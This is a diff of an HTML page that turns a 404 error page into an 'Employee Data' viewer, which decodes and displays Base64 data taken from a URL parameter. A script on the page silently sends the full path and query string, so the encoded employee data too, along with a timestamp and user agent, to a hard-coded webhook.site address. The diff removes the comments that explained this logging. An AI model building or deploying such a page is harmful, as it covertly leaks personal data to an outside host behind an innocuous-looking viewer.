@@ -2,29 +2,40 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Page Not Found</title>
+  <title>Employee Data</title>
   <style>
     body {
-      font-family: sans-serif;
+      font-family: Arial, sans-serif;
+      max-width: 700px;
+      margin: 5% auto;
+      line-height: 1.6;
+      color: #333;
       text-align: center;
-      margin-top: 10%;
     }
-    #path {
-      font-weight: bold;
+    #data-box {
+      background: #f5f5f5;
+      padding: 1em;
+      border-radius: 10px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      text-align: left;
+      white-space: pre-wrap;
+      word-break: break-word;
+      margin-top: 1em;
+    }
+    #error {
       color: red;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
-  <h1>404 - Page Not Found</h1>
-  <p>You tried to visit: <span id="path"></span></p>
+  <h1>Employee Data</h1>
+  <div id="data-box">Loading employee data...</div>
 
   <script>
-    // Show the path to the user
     const path = window.location.pathname + window.location.search;
-    document.getElementById("path").textContent = path;
 
-    // Send to webhook.site using GET (no CORS issue)
+    // Send request info to webhook
     const params = new URLSearchParams({
       page: path,
       time: new Date().toISOString(),
@@ -32,9 +43,24 @@
       userAgent: navigator.userAgent
     });
 
-    // Replace with your unique webhook.site URL
     fetch("https://webhook.site/89e64e17-f805-4541-9f73-9567abe15011?" + params)
       .catch(err => console.error("Log failed:", err));
+
+    // Decode Base64
+    const box = document.getElementById("data-box");
+    const query = new URLSearchParams(window.location.search);
+    const base64Data = query.get("api!employee");
+
+    if (base64Data) {
+      try {
+        const decoded = atob(base64Data);
+        box.textContent = decoded;
+      } catch (e) {
+        box.innerHTML = '<span id="error">Invalid employee data format.</span>';
+      }
+    } else {
+      box.innerHTML = '<span id="error">No employee data provided.</span>';
+    }
   </script>
 </body>
 </html>
